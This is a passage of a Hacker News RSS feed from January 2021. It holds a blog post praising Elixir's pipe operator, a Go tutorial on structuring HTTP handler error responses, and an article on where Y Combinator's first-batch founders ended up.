<p>Got tips about what we should cover, or questions for our editorial team? Let us know at news@blockworks.co</p>
<div>
        
    <ul>
                    <li>
                                <p><img alt="" src="https://blockworks.co/wp-content/uploads/2021/01/JasonYanowitz-1.jpg" srcset="https://blockworks.co/wp-content/uploads/2021/01/JasonYanowitz-1.jpg" height="160" width="160" data-srcset="https://blockworks.co/wp-content/uploads/2021/01/JasonYanowitz-1.jpg" data-src="https://blockworks.co/wp-content/uploads/2021/01/JasonYanowitz-1.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
                </p>
                                <div>
                <p><a href="https://blockworks.co/author/jasonblockworksgroup-io/" rel="author">Jason Yanowitz</a></p><p>Blockworks</p>
                <p>Co-founder</p>
                

                                </div>
            </li>
            </ul>
</div>
    </div></div>]]>
            </description>
            <link>https://blockworks.co/launch-announcement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780097</guid>
            <pubDate>Thu, 14 Jan 2021 18:28:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Sublime Developer Efficiency of Elixir, Phoenix and LiveView]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780063">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html | <a href="https://web.archive.org/web/*/https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<!-- The top of the page -->
	
	
	<table>
	<tbody><tr>
		<td>
	<h2 id="subhead">SW engineering, engineering management and the business of software</h2>
		</td>
		<td>
<!-- Begin MailChimp Signup Form -->

<!--End mc_embed_signup-->
		</td>
	</tr>
	</tbody></table>


	<br>

<!-- The middle of the page -->


	
	
	
	
	
	
	<p><span>Editor’s note: This is part one of a short series. You can find <a href="http://amattn.com/p/elixir_phoenix_the_business_case_for_liveview_strong_enough_to_change_how_you_staff_your_dev_team.html">part two</a> here. <span></span></span></p>

<p>I’ve spent the last month and change working on a <a href="https://habit.show/">little side project</a>.</p>

<p>The interesting thing about this one is that it’s written completely in <a href="https://elixir-lang.org/">Elixir</a>.  This is a post about my experience doing so.</p>

<p>Elixir is a language that came out of the heyday of Ruby on Rails about a decade ago.  It was originally billed as “Ruby on the Erlang VM”, trying to blend the best of both worlds.  Spoiler, I believe it has largely succeeded.</p>

<p>It’s still got quite a bit of Ruby influence, but overall, it’s much more functional.  You will see maps, filters and reduce’s all over your code base.</p>

<p>From the Erlang side of the family, you’ll see a lot. There’s no mutability.  Variables cannot be changed, you can only create new ones from combining or transforming existing.  Pattern Matching is everywhere and it’s still quite powerful.  You can trivially call down to Erlang primitives whenever you need to.</p>

<p>The Ruby influence is more in style and syntactic sugar.  You’ll see your <code>def</code>’s and <code>end</code>’s and <code>-&gt;</code>’s.  You can skip parenthesis around function arguments if it doesn’t introduce ambiguity.  There’s no early return, you always return the last expression.  Map and list syntax will be fairly familiar.  The @ prefix denotes attributes / decorators.  Atons.</p>

<p>It’s got some quirks.  The native list primitive is a classic linked list, not an array.  This means that prepend is cheap, but count, insert, append is expensive.  It also means you can do head/tail car/cdr operations quite easily.  Keyword lists as a weird list/map hybrid.</p>

<h2>Digging into the pipe operator</h2>

<p><a name="b1"></a>
The <code>|&gt;</code> operation is a particularly good example.  To most newcomers, it’s a weird, inscrutable symbol whose operation isn’t easily intuited.<sup><a href="#1">1</a></sup>  Yet once you get used to it, there’s quite a bit of elegance to it, and even historical reference to the pipe operation in the shell.</p>

<p>For those new to the language it works like this:  take the input of the pipe operation (x below) and pass it as the first argument of the target function of the pipe operator.</p>

<pre><code>x
|&gt; function(y, z)
</code></pre>

<p>is equivalent to</p>

<pre><code>function(x, y, z)
</code></pre>

<p>The elegance comes from chaining these together like so;</p>

<pre><code>x
|&gt; function(y, z)
|&gt; other_function(a, b)
|&gt; yet_another_function(c)
</code></pre>

<p>If this is the last expression in a function you return the results of the final <code>yet_another_function</code></p>

<p>You can also bind it to a variable like so:</p>

<pre><code>final_output =
  x
  |&gt; function(y, z)
  |&gt; other_function(a, b)
  |&gt; yet_another_function(c)
</code></pre>

<p>The pipe metaphor breaks down as you start with x, do a ton of transformation on it and your eyes have to scan way back to the beginning to see what variable you are assigning the final results to.</p>

<p>It kind of micro-example of the entire macro-experience of using Elixir:</p>

<ul>
<li>It’s quirky</li>
<li>There’s a learning curve</li>
<li>Taking the time to climb that curve can result in elegant solutions</li>
<li>The endgame is high developer efficiency</li>
</ul>

<h2>An actual example</h2>

<p>To see an actual code snippet with pipes in action:</p>

<pre><code>collected_errors =
  Date.range(start_date, yesterday)
  |&gt; Enum.to_list()
  |&gt; Enum.filter(fn _ -&gt;
    random_number = :rand.uniform(100)
    random_number &lt; 75
  end)
  |&gt; Enum.map(fn date -&gt;
    make_map_of_attrs(date, user, some_bool, some_int)
  end)
  |&gt; Enum.reduce([], fn entity_attr, all_errors -&gt;
    case create_entity_with_attr(entity_attr) do
       {:ok, _entity} -&gt;
         all_errors
       {:error, err_msg} -&gt;
         [err_msg | all_errors]
    end
  end)
</code></pre>

<p>If the above looks like moon runes, it’s probably just because the syntax is new to your eyes.  After a week or so with the language, it reads very clearly.  Walking thru that snippet, we start with the second line:</p>

<ol>
<li>Create a date range between two dates (a range is essentially an entity with a start and end.)</li>
<li>Take that range and convert it into a linked list, filling in all the dates inbetween</li>
<li>Throw away about 25% of the dates, randomly</li>
<li>For each date, create a struct (map) which contains kv pairs of data, including the date.<br>

<ul>
<li>The output of this is a list of maps which gets passed on</li>
</ul></li>
<li>Take that list of maps and create defined structs.  Typically a <code>create_</code> prefix means you are creating and object and often storing it in some persistence layer.<br>

<ul>
<li>If no error occurred during the create statement, just pass along the error accumulator unmodified.</li>
<li>Any errors that do occure get prepended into the <code>all_errors</code> accumulator during the reduce operation.</li>
</ul></li>
<li>Finally we put the result of the reduce operation (any accumulated errors) and bind that to the <code>collected_errors</code> variable.</li>
</ol>

<h2>The endgame is high developer efficiency</h2>

<p>I’m very, very fond of go, but a typical implementation of equivalent functionality would typically be <strong>at least 5x longer and certainly more irritating to write.</strong></p>

<p>So, back to that macro experience of using Elixir:</p>

<ul>
<li>It’s quirky</li>
<li>There’s a learning curve</li>
<li>Taking the time to climb that curve can result in elegant solutions</li>
<li>The endgame is high developer efficiency</li>
</ul>

<p>That last bullet point, in my relatively short experience with Elixir, I’m fairly certain the overall developer productivity is quite high.  Likely in the top quartile or better of all development environments (possibly even top 10%).  There are <a href="https://smartlogic.io/podcast/elixir-wizards/s5e5-vo/">others who think so as well</a>.</p>

<p>The <em>combination</em> of the last two bullets is what I refer to as sublime efficiency in the title of this post.  This is a rare combination.  I believe go to be a great language for “IDE to prod” developer productivity, but I don’t believe it is a particularly elegant language.  Lisp and it’s variants can be quite elegant but you will run into feature velocity problems at some point (deployment, ecosystem, hiring…).</p>

<p>Developing in a modern functional language, with great safeguards (pattern matching, guards, type annotations, strong testing libraries, etc.) somehow allows developers to be efficient, write elegant code and also achieve high feature velocity.</p>

<p><a name="b2"></a>
It’s clearly not a perfect language or ecosystem.  The deployment story is not as good as go.<sup><a href="#2">2</a></sup></p>

<p>But it is one that I could see a lot of companies using as a competitive advantage with respect to time to market of getting product out.</p>

<p>All you have to do is get over the learning curve.</p>

<hr>

<p>Authors’s Note:</p>

<p>This post is the first of a two part series.  You can find the second part <a href="http://amattn.com/p/elixir_phoenix_the_business_case_for_liveview_strong_enough_to_change_how_you_staff_your_dev_team.html">here</a>.</p>

<ul>
<li><a href="https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html">Part 1</a>: Elixir</li>
<li><a href="http://amattn.com/p/elixir_phoenix_the_business_case_for_liveview_strong_enough_to_change_how_you_staff_your_dev_team.html">Part 2</a>: Phoenix &amp; LiveView</li>
</ul>

<p>Lastly, I do live code streaming about Elixir, Phoenix, and LiveView on twitch.tv. You should follow me <a href="https://twitch.tv/amattn">there</a>.</p>

<hr>

<p>Footnotes:</p>

<ol>
<li><a name="1"></a>OCaml and F# have a similar operator and predate Elixir. The creator of Elixir himself thinks it <a href="https://elixirforum.com/t/which-language-first-introduced-the-pipe-operator/16791/8">came from F#</a>.<a href="#b1">↩</a></li>
<li><a name="2"></a>To be fair, no language ecosystem has a deployment story as good as go.  I would put elixir above any other dynamic language like python, ruby.  Being dependent on the erlang VM, it’s more like deploying a Java app (if you squint).  The tooling is <a href="https://amattn.com/p/deploying_elixir_phoenix_webapps_to_the_cloud_with_releases.html">there</a> and actively getting better.<a href="#b2">↩</a></li>
</ol>



<br>


<br>


<!-- The bottom of the page -->
	<br>
	
	
	<a href="" id="backup" name="bottom">back ⬆</a>



</div>]]>
            </description>
            <link>https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780063</guid>
            <pubDate>Thu, 14 Jan 2021 18:25:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elegance of Go's Error Handling]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780009">thread link</a>) | @wagslane
<br/>
January 14, 2021 | https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/ | <a href="https://web.archive.org/web/*/https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>Every so often, go’s error handling pops up in various forums and everyone seems
to have an opinion about it. Some say they should be more like throwable
exceptions, others prefer sum types like rust’s <code>Result&lt;T, E&gt;</code>. While I’ve gone
with the sum type <a href="https://dev.to/duunitori/mimicing-rust-s-result-type-in-typescript-3pn1">approach in typescript</a>,
I still like the way go handles errors.</p>
<p>That said, figuring out how to <em>really</em> handle errors can take some time (with
or without sum types/exceptions). In this post, I’ll be walking through one
approach on handling errors in go’s <code>http.Handler</code>.</p>

<p>The error values can be frustrating if you expect them to scale out “just like
that” without repeating themselves. Usual example goes something like this:</p>
<div><pre><code data-lang="golang"><span>func</span> copyfile(src, dst) <span>error</span> {
	fsrc, err := os.Open(src)
	<span>if</span> err != <span>nil</span> {
		<span>return</span> err
	}
	<span>defer</span> fsrc.Close()

	fdst, err := os.Open(src)
	<span>if</span> err != <span>nil</span> {
		<span>return</span> err
	}
	<span>defer</span> fdst.Close()

	err := io.Copy(fdst, fsrc)

	<span>return</span> err
}
</code></pre></div><p>Thats not so bad, and I’m quite sure that most of you have seen example like
that before. But let’s take a look at similar situation that might occur in a
<code>http.Hanlder</code>:</p>
<div><pre><code data-lang="golang"><span>func</span> handleThing(w http.ResponseWriter, r *http.Request) {
	<span>// Our path is something like /thing/3
</span><span></span>	id, err := idFromPath(r.URL.Path)
	<span>if</span> err != <span>nil</span> {
		http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusNotFound)
		<span>return</span>
	}

	thing, err := store.GetThingByID(id)
	<span>if</span> err != <span>nil</span> {
		<span>// The error might be sql.NoRows, or it might be something else.
</span><span></span>		<span>if</span> store.IsNotFoundErr(err) {
			http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
			<span>return</span>
		}
		log.Printf(<span>"Failed to get a thing: %v"</span>, err)
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		<span>return</span>
	}

	acc := AccountFromRequest(r)
	<span>if</span> acc == <span>nil</span> {
		<span>// No account attached to the request's session -&gt; permission denied.
</span><span></span>		http.Error(w, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		<span>return</span>
	}

	has, err := thing.HasPermissionToView(acc)
	<span>if</span> err != <span>nil</span> {
		<span>// For some reason, we failed to check permissions. Better log it.
</span><span></span>		log.Printf(<span>"Failed to check permissions: %v"</span>, err)
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		<span>return</span>
	}

	<span>if</span> !has {
		<span>// Permission denied.
</span><span></span>		http.Error(w, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		<span>return</span>
	}

	<span>// All good, send data to the client.
</span><span></span>	respond(w, r, decodeThing(thing))
}
</code></pre></div><p>Theres some functions that you’ll have to imagine is defined somewhere, but the
functionality is this:</p>
<ul>
<li>Extract ID from URL</li>
<li>Use that ID to get the thing from database</li>
<li>Check if the client has permission to view the thing</li>
<li>Give the thing to the client</li>
</ul>
<p>This functionality probably repeats itself for other resource types, so it gets
repetitive quite fast. Imagine doing the same for resources like foo, bar,
account and so on! Same functionality can be written in Django like this:</p>
<div><pre><code data-lang="python"><span>def</span> handle_thing(request):
    id = id_or_bad_request(request)
    thing = thing_or_404(id)

    account = account_or_forbidden(request)

    <span>if</span> <span>not</span> thing.has_permission(account):
        <span>raise</span> Forbidden()

    <span>return</span> JsonResponse(...)
</code></pre></div><p>Now that’s quite a lot simpler, thanks to throwable errors and how they
can be used to disrupt the code’s flow. <code>id_or_bad_request</code>, <code>thing_or_404</code> and
<code>account_or_forbidden</code> all throw an error that someone catches somewhere higher
and does the appropriate thing, like respond with correct status code and log
any errors.</p>

<p>Keeping that python code in mind, let’s think what we could do in our go code to
get it a bit more terse:</p>
<ul>
<li>When an error occurs, we just want to “throw” it somewhere. It usually is a
client error, but not always. Perhaps someone else can figure that out?</li>
<li>If a non client error occurs, it needs to be logged somewhere</li>
<li>Someone else should be able figure out the <code>http.Error</code> calls</li>
</ul>
<p>Golang’s <a href="https://blog.golang.org/error-handling-and-go">error handling and Go</a>
talks a bit about error handling in your http handlers and gives the following
example:</p>
<div><pre><code data-lang="golang"><span>func</span> viewRecord(w http.ResponseWriter, r *http.Request) <span>error</span> {
    c := appengine.NewContext(r)
    key := datastore.NewKey(c, <span>"Record"</span>, r.FormValue(<span>"id"</span>), 0, <span>nil</span>)
    record := new(Record)
    <span>if</span> err := datastore.Get(c, key, record); err != <span>nil</span> {
        <span>return</span> err
    }
    <span>return</span> viewTemplate.Execute(w, record)
}

<span>// NOTE: the following is my adapted version from the example's ServeHTTP to a
</span><span>// middleware/wrapper
</span><span></span>
<span>type</span> HandlerE = <span>func</span>(w http.ResponseWriter, r *http.Request) <span>error</span>

<span>func</span> WithError(h HandlerE) http.HandlerFunc {
	<span>return</span> <span>func</span>(w http.ResponseWriter, r *http.Request) {
		<span>if</span> err := h(w, r); err != <span>nil</span> {
			http.Error(w, err.Error(), 500)
		}
	}
}
</code></pre></div><p>That already solves one of our problems, which is the <code>http.Error</code> call. But
sometimes we don’t want to expose detailed errors to the client, so I would
replace the actual message with just a generic internal server error message.
Also, logging the reasons for internal server errors is important, so that you
can figure out what went wrong.</p>

<p>We want to return an error from our <em>actual</em> <code>http.Handler</code>, but somehow
instruct the <code>WithError</code> wrapper function to respond correctly to the client
when it gets an error, and on some errors log the errors. Something like this:</p>
<div><pre><code data-lang="golang"><span>func</span> WithError(h HandlerE) http.HandlerFunc {
	<span>return</span> <span>func</span>(w http.ResponseWriter, r *http.Request) {
		<span>if</span> err := h(w, r); err != <span>nil</span> {

			<span>if</span> is404err(err) {
				http.Error(w, <span>"not found"</span>, 404)
				<span>return</span>
			}

			<span>if</span> isBadRequest(err) {
				http.Error(w, <span>"bad request"</span>, 400)
				<span>return</span>
			}

			<span>// Some other special cases...
</span><span></span>			<span>// ...
</span><span></span>
			log.Printf(<span>"Something went wrong: %v"</span>, err)

			http.Error(w, <span>"Internal server error"</span>, 500)
		}
	}
}
</code></pre></div><p>Hmm, those “other special” cases might come and go and might get quite specific
for some handlers. Also, we’d still need to write those <code>is404err</code> and
<code>isBadRequest</code> handlers and whatever will follow. We can do much better with an
interface:</p>
<div><pre><code data-lang="golang"><span>type</span> ErrorResponder <span>interface</span> {
    <span>// RespondError writes an error message to w. If it doesn't know what to
</span><span></span>    <span>// respond, it returns false.
</span><span></span>	RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span>
}
</code></pre></div><p>With this interface we can do quite powerful things. Our <code>WithError</code> turns into
this:</p>
<div><pre><code data-lang="fallback">
func WithError(h HandlerE) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if err := h(w, r); err != nil {
			if er, ok := err.(ErrorResponder); ok {
				if er.RespondError(w, r) {
					return
				}
			}

			log.Printf("Something went wrong: %v", err)

			http.Error(w, "Internal server error", 500)
		}
	}
}
</code></pre></div><p>Notice how our special cases just disappeared? They are now just another
implementation(s) of <code>ErrorResponder</code>. This is what would our <code>Not found</code> and <code>Bad request</code> errors now looks like:</p>
<div><pre><code data-lang="golang">
<span>// BadRequest error responds with bad request status code, and optionally with
</span><span>// a json body.
</span><span></span><span>type</span> BadRequestError <span>struct</span> {
	err  <span>error</span>
	body <span>interface</span>{}
}

<span>func</span> BadRequest(err <span>error</span>) *BadRequestError {
	<span>return</span> &amp;BadRequestError{err: err}
}

<span>func</span> BadRequestWithBody(body <span>interface</span>{}) *BadRequestError {
	<span>return</span> &amp;BadRequestError{body: body}
}

<span>func</span> (e *BadRequestError) RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span> {
	<span>if</span> e.body == <span>nil</span> {
		http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
	} <span>else</span> {
		w.WriteHeader(http.StatusBadRequest)

		w.Header().Set(<span>"Content-Type"</span>, <span>"application/json"</span>)
		err := json.NewEncoder(w).Encode(e.body)

		<span>if</span> err != <span>nil</span> {
			log.Printf(<span>"Failed to encode a response: %v"</span>, err)
		}
	}

	<span>return</span> <span>true</span>
}

<span>func</span> (e *BadRequestError) Error() <span>string</span> {
	<span>return</span> e.err.Error()
}

<span>// Maybe404Error responds with not found status code, if its supplied error
</span><span>// is sql.ErrNoRows.
</span><span></span><span>type</span> Maybe404Error <span>struct</span> {
	err <span>error</span>
}

<span>func</span> Maybe404(err <span>error</span>) *Maybe404Error {
	<span>return</span> &amp;Maybe404Error{err: err}
}

<span>func</span> (e *Maybe404Error) Error() <span>string</span> {
	<span>return</span> fmt.Sprintf(<span>"Maybe404: %v"</span>, e.err.Error())
}

<span>func</span> (e *Maybe404Error) Is404() <span>bool</span> {
	<span>return</span> errors.Is(e.err, sql.ErrNoRows)
}

<span>func</span> (e *Maybe404Error) RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span> {
	<span>if</span> !e.Is404() {
		<span>return</span> <span>false</span>
	}

	http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
	<span>return</span> <span>true</span>
}
</code></pre></div><p>You could easily write more <code>ErrorResponder</code>s for permission denied errors and
much more.</p>

<p>With <code>ErrorResponder</code> and <code>WithError</code>, we can reduce our earlier <code>handleThing</code>
handler into this:</p>
<div><pre><code data-lang="golang"><span>func</span> handleThing(w http.ResponseWriter, r *http.Request) <span>error</span> {
	<span>// Our path is something like /thing/3
</span><span></span>	id, err := idFromPath(r.URL.Path)
	<span>if</span> err != <span>nil</span> {
		<span>// Literally bad request. We could use BadRequestWithBody to
</span><span></span>		<span>// respond with a fancy information for the client.
</span><span></span>		<span>return</span> BadRequest(err)
	}

	thing, err := store.GetThingByID(id)
	<span>if</span> err != <span>nil</span> {
		<span>// Likely a not found issue, but something else might have gone wrong.
</span><span></span>		<span>// Maybe404Error handles both cases.
</span><span></span>		<span>return</span> Maybe404(err)
	}

	acc := AccountFromRequest(r)
	<span>if</span> acc == <span>nil</span> {
		<span>// No account attached to the request. Client needs to authenticate.
</span><span></span>		<span>return</span> AuthenticationRequired()
	}

	has, err := thing.HasPermissionToView(acc)
	<span>if</span> err != <span>nil</span> {
		<span>// Something actually went wrong. Error will be logged and 500 message
</span><span></span>		<span>// sent to the client.
</span><span></span>		<span>return</span> err
	}

	<span>if</span> !has {
		<span>// Client doesn't have permission to view this resource.
</span><span></span>		<span>return</span> PermissionDenied()
	}

	<span>// All good, send data to the client.
</span><span></span>	respond(w, r, decodeThing(thing))
}

<span>func</span> main() {
	...
	mux.Handle(<span>"/thing/"</span>, WithError(handleThing))
	...
}
</code></pre></div><p>Thats a lot better! I’ll leave it as an exercise to the reader to combine the
auth and permission checking. Another exercise is to do a bit better logging
than just “Something went wrong: <em>error</em>” in the WithError function. Perhaps log
the path and requester, or use trace ids?</p>
<p>With all this, we can now:</p>
<ul>
<li>“throw” errors somewhere</li>
<li>Someone else is figuring out the <code>http.Error</code> calls</li>
<li>Non client errors are logged</li>
</ul>

<p>Sometimes I’m amazed just by how simple (yet powerful) go’s error type is. Other
times I’m banging my head against the wall because I can’t figure out how to use
that simplicity. The solution presented in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/">https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/</a></em></p>]]>
            </description>
            <link>https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780009</guid>
            <pubDate>Thu, 14 Jan 2021 18:22:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[0xb1adceddb2941033a090dd166a462fe1c2029484]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779763">thread link</a>) | @ipnon
<br/>
January 14, 2021 | https://debank.com/portfolio/0xb1adceddb2941033a090dd166a462fe1c2029484 | <a href="https://web.archive.org/web/*/https://debank.com/portfolio/0xb1adceddb2941033a090dd166a462fe1c2029484">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://debank.com/portfolio/0xb1adceddb2941033a090dd166a462fe1c2029484</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779763</guid>
            <pubDate>Thu, 14 Jan 2021 18:05:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Y Combinator’s First Batch: Where are they now?]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25779621">thread link</a>) | @smalera
<br/>
January 14, 2021 | https://www.businessofbusiness.com/articles/y-combinator-where-are-they-now-first-batch-reddit-twitch/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/y-combinator-where-are-they-now-first-batch-reddit-twitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p><span>When Paul Graham and Jessica Livingston first began accepting applications for their new startup accelerator, they had $200,000 in seed money and four employees.</span></p>
<p><span>Graham, who had been working at a web application company called Viaweb, wasn’t particularly confident that their new venture would do well. But Graham wanted to invest in promising college students building innovative tech startups, much like his mentor, lawyer Julian Weber, had invested $10,000 in Graham’s own Viaweb.&nbsp;</span></p>
<p><span>Despite their misgivings, Graham and Livingston plowed ahead, creating a Silicon Valley icon in the process. To date, Y Combinator has helped launch and fund over 2,000 startups in Silicon Valley, including giants like Airbnb, Dropbox, Stripe, Reddit, DoorDash, Coinbase, and many more. As of 2021, the combined value of YC’s startups is estimated at $300 billion. Today, founders still aspire to get into one of YC’s batches.&nbsp;</span></p>
<p><span>Y Combinator’s consistently successful 16-year run all started with that First Batch, which included founders like Alexis Ohanian, Steve Huffman, Sam Altman, and Justin Kan. Last week, Kan </span><a href="https://twitter.com/justinkan/status/1337122637483364354?s=20"><span>tweeted an image</span></a><span> of YC’s First Batch dating back to the summer of 2005. It’s worth seeing how the years have treated that very first batch.</span></p>
<h2><b>2. Zak Stone</b></h2>
<p><b><img alt="" height="393" src="https://static.media.thinknum.com/media/uploads/.thumbnails/zak_stone.jpg/zak_stone-700x393.jpg" width="700"><span></span></b></p>
<p><b>Co-founder, Memamp<br></b><b>Where is he now?<br></b><b>Product manager for Cloud TPUs, Google</b></p>
<p><span>Along with Chris Slowe, Zak Stone co-founded Memamp, a desktop search startup. The two had been working on their idea for about a year before being accepted into Y Combinator’s First Batch, but it wasn’t meant to be. That summer, Google released its own desktop search feature, and Apple announced its Spotlight search feature for Macs. While Stone and Slowe decided to scrap the idea, Slowe joined up with Reddit’s founders. Stone, meanwhile, now works for Google’s Brain Team as a product manager for Cloud TPUs.</span></p>
<h2><span>3. Steve Huffman<br></span><span>4. Alexis Ohanian<br></span><span>6. Chris Slowe<br></span><span>10. Aaron Swartz</span></h2>
<p><span><img alt="" height="393" src="https://static.media.thinknum.com/media/uploads/.thumbnails/reddit.jpg/reddit-700x393.jpg" width="700"><span></span></span></p>
<p><b>Founders, Reddit<br></b><b>Where are they now?<br></b><b>Ohanian: Entrepreneur, investor<br></b><b>Huffman: CEO, Reddit<br></b><b>Slowe: CTO, Reddit<br></b><b>Swartz: Committed suicide in 2013 at age 26.</b></p>
<p>After the initial rejection of their first startup idea, MyMobileMenu, Alexis Ohanian and his fellow founders started work on “the front page of the internet.” That project,&nbsp;an idea that came from Paul Graham,&nbsp;turned into Reddit, one of Y Combinator’s most successful startups. When it was bought by Condé Nast in 2006, Ohanian was suddenly a multi-millionaire and one of Silicon Valley’s most revered founders, all by age 23. Since co-founding Reddit, Ohanian has founded several other startups and venture capital firms, including Breadpig, Hipmunk, Das Kapital Capital, and Initialized Capital. His wife, tennis superstar Serena Williams, also founded her own VC firm, Serena Ventures.&nbsp;</p>
<p><span>Steve Huffman, Reddit’s second co-founder, served as CEO of the company until 2009, then returned to the role in 2015. Although Huffman and Ohanian sold Reddit for $10 million to $20 million, Huffman later said that he regretted the decision, not realizing how popular the site would become. As of 2019, the company was worth $3 billion. Huffman went on to co-found Hipmunk, a travel search site, before returning to the startup that started it all.</span></p>
<p><span>Chris Slowe is still with Reddit as its CTO (and is a former CEO), but spent some years away from the company before returning in 2015. Slowe also worked for Hipmunk as chief scientist, citing the desire for change as his main reason for leaving Reddit.</span></p>
<p><span>Reddit’s fourth co-founder, Aaron Swartz, arrived late to the party when his own startup, Infogami, merged with the company. Later on, Swartz devoted his time to a number of social causes, helping launch the Progressive Change Campaign Committee to support online activism. He also founded the online group Demand Progress which led a campaign against the Stop Online Piracy Act in 2010.&nbsp;</span></p>
<p><span>In 2011, Swartz was arrested on breaking-and-entering charges on the MIT campus after illegally downloading academic articles from a university database. He was charged in federal court with two counts of wire fraud, among other charges, and faced 35 years in prison. Days after a rejected plea bargain and counter offer to minimize his sentence, Swartz was found dead in his Brooklyn apartment by apparent suicide. He was 26 years old.</span></p>
<h2><b>5. Emmett Shear<br></b><b><b>11. Justin Kan</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/justin_kan_emmett_shear.jpg/justin_kan_emmett_shear-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Kiko<br></b><b><b>Where are they now?<br></b></b><b><b>Shear: CEO, Twitch<br></b></b><b><b>Kan: CEO of shuttered startup Atrium</b></b></p>
<p><span>Justin Kan and Emmett Shear have found massive success since first signing up for Y Combinator’s first class. The founders sold their online calendar startup, Kiko, a year after graduating YC, when they realized the new Google Calendar would eclipse their own startup. Kan and Shear went on to found Justin.tv, a livestream site that Kan himself used to document his daily life for eight months. The two then founded livestream gaming site Twitch as a spin-off of Justin.tv, which has grown into a $15 billion business.&nbsp;</span></p>
<h2><span>8. Philip Yuen</span></h2>
<h3><strong><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/philip_yuen-2.jpg/philip_yuen-2-700x420.jpg" width="700"><span></span></strong></h3>
<h3><strong>Founder, TextPayMe<br>Where is he now?<br>CEO, Aurabeat Technology</strong></h3>
<h2><b><b>13. Mikhail Ledvich</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/mikhail_ledvich-2.jpg/mikhail_ledvich-2-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Clickfacts<br></b><b>Where is he now?<br></b><b></b><strong>VP, Senior Digital Product Consultant, Bank of America</strong></p>
<p><span>Clickfacts, one of the lesser known startups to come out of Y Combinator, was a malware software solutions company. After YC, its co-founders continued running their startup until its demise sometime after 2012. Although it didn’t generate much buzz while it was up and running, Clickfacts became the longest running startup from YC’s First Batch not to be acquired. Mikhail Ledvich, who was also a product architect at Clickfacts, today works for Bank of America as a VP and senior digital product consultant.</span></p>
<h2><b>14. Sam Altman<br></b><b><b>Not pictured: Nick Sivo&nbsp;</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/sam_altman_nick_sivo.jpg/sam_altman_nick_sivo-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Loopt<br></b><b>Where are they now?<br></b><b>Altman: CEO, OpenAI<br></b><b>Sivo: Runs YC Hacker News</b></p>
<p><span>After Loopt failed to gain traction in the years following its run with Y Combinator, Sam Altman and Nick Sivo sold their startup in 2012. Since then, Altman has kept close ties with YC, first becoming a part-time partner, then president of the startup accelerator in 2014. Altman is also CEO of OpenAI, an artificial intelligence research startup he co-founded with Elon Musk. Nick Sivo has also spent his post-Loopt years at Y Combinator, maintaining their Hacker News site, though he’s largely stayed out of the public eye.</span></p>
<h2><b><b>15. Jesse Tov</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/jesse_tov-2.jpg/jesse_tov-2-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founder, Simmery Axe<br></b><b>Where is he now?<br></b><b></b><strong>Computer Science Professor at Northwestern University</strong></p>
